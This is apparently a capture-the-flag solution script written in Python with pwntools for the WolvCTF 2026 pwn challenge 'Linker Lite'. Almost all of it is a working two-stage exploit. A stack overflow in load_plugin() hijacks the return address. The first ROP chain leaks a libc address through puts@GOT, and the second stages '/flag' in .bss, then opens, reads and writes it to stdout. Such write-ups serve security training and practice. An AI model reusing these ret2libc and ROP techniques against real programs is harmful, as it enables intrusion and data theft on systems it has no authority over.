"""
title: Linker Lite
ctf: WolvCTF 2026
category: pwn
difficulty: 2
arch: amd64
linking: dynamic
mitigation_gaps: [no-pie, no-canary, partial-relro, not-stripped]
vulnerabilities: [stack-overflow]
tags: [ret2libc, rop, libc-leak, orw]
"""
from pwn import *
import re

# =====
# RECON
# =====
# Dynamically linked, no PIE, no canary.
# load_plugin() reads a "plugin blob" into a stack buffer through read_full(),
# which keeps reading until it has gathered 0x100 bytes, far past the buffer.
# There is no win function and no helpful string: the flag lives at /flag on
# the remote, so it has to be open/read/write'd through libc.

# =====
# VULNERABILITY
# =====
# Buffer at rbp-0x40, overflowed by read_full()'s 0x100-byte quota.
# => saved RIP is controlled, with room for a generous ~23-word ROP chain.
BUFF_TO_RBP_OFF = 0x40
READ_BYTE_QUOTA = 0x100

# =====
# PLAN
# =====
# No PIE, so binary-side addresses (PLT stubs, GOT, gadgets) are fixed, only
# libc is randomised.
#   Step 1: leak a libc address with puts(puts@GOT), then return into
#           load_plugin() to get a second payload.
#   Step 2: derive the libc base, then ORW: stage "/flag" in .bss, open it,
#           read it, write it to stdout.

# =====
# CONSTANTS
# =====

# --- Gadget (ROPgadget) ---
POP_RDI_POP_RSI_POP_RDX_RET_ADDR = 0x401223   # sets the three arg registers at once

# --- Fixed binary addresses (no PIE) ---
PUTS_PLT_ADDR = 0x401030          # call puts() via its PLT stub
PUTS_GOT_ADDR = 0x404018          # GOT slot holding the resolved libc puts
LOAD_PLUGIN_ADDR = 0x4011B2       # re-enter load_plugin() for a second payload
BSS_SCRATCH_ADDR = 0x404049       # free .bss space to stage "/flag"

# --- libc offsets (resolved from the exact challenge libc) ---
libc = ELF("./libc.so.6")
puts_off = libc.symbols["puts"]
open_off = libc.symbols["open"]
read_off = libc.symbols["read"]
write_off = libc.symbols["write"]

# =====
# EXPLOIT
# =====

# --- Step 1: leak libc base ---

# Build the chain: puts(&puts@GOT) prints the resolved libc address of puts,
# then the return into load_plugin() loops back for the second-stage payload.
payload = b"A" * (BUFF_TO_RBP_OFF + 0x8)             # overflow buffer + saved rbp
payload += p64(POP_RDI_POP_RSI_POP_RDX_RET_ADDR)
payload += p64(PUTS_GOT_ADDR)                        # rdi = what to print
payload += p64(1)                                    # rsi, unused by puts
payload += p64(0)                                    # rdx, unused by puts
payload += p64(PUTS_PLT_ADDR)                        # puts(&puts@GOT)
payload += p64(LOAD_PLUGIN_ADDR)                     # loop back for stage 2
payload += b"A" * (READ_BYTE_QUOTA - len(payload))   # pad to quota so read_full returns

# Spawn the target and send stage 1 once the blob prompt shows up.
p = process("./linker-lite")
p.recvuntil(b"send plugin blob:\n")
p.send(payload)

# Parse the leaked puts address and subtract its offset to get the libc base.
leak = p.recvline().strip()
libc_puts_addr = u64(leak.ljust(8, b"\x00"))
libc_base = libc_puts_addr - puts_off
print(f"{libc_puts_addr=:#x}")
print(f"{libc_base=:#x}")

# Resolve the libc functions used by the ORW chain.
open_addr = libc_base + open_off
read_addr = libc_base + read_off
write_addr = libc_base + write_off

# --- Step 2: open/read/write the flag ---

# Execution has been rewound to the start of load_plugin(), so overflow again.
payload = b"A" * (BUFF_TO_RBP_OFF + 0x8)             # overflow buffer + saved rbp

# read(stdin, scratch, 6): stage "/flag\0" into writable memory.
payload += p64(POP_RDI_POP_RSI_POP_RDX_RET_ADDR)
payload += p64(0) + p64(BSS_SCRATCH_ADDR) + p64(6)
payload += p64(read_addr)

# open(scratch, O_RDONLY).
# NOTE: open() returns the lowest free file descriptor. stdin/stdout/stderr
# hold 0/1/2 and nothing else is open, so the flag predictably lands on fd 3,
# which the next read() uses.
payload += p64(POP_RDI_POP_RSI_POP_RDX_RET_ADDR)
payload += p64(BSS_SCRATCH_ADDR) + p64(0) + p64(0)
payload += p64(open_addr)

# read(3, scratch, 0x100): slurp the flag into the same buffer.
payload += p64(POP_RDI_POP_RSI_POP_RDX_RET_ADDR)
payload += p64(3) + p64(BSS_SCRATCH_ADDR) + p64(0x100)
payload += p64(read_addr)

# write(stdout, scratch, 0x100): print it back, trailing bytes are just noise.
payload += p64(POP_RDI_POP_RSI_POP_RDX_RET_ADDR)
payload += p64(1) + p64(BSS_SCRATCH_ADDR) + p64(0x100)
payload += p64(write_addr)

# Pad to the read quota so read_full returns and the chain fires.
payload += b"A" * (READ_BYTE_QUOTA - len(payload))

# Send stage 2, then feed the path string the staged read() gadget expects.
p.send(payload)     # consumed by read_full()
p.send(b"/flag\0")  # consumed by the read() gadget

# --- Flag ---

# Extract the flag from the program output.
output = p.recvall(timeout=5)
match = re.search(rb"wctf\{[^}]*\}", output)
if match:
    print(f"Found flag: {match.group(0).decode()}")
else:
    print("Flag not found in the output:")
    print(output.decode(errors="replace"))
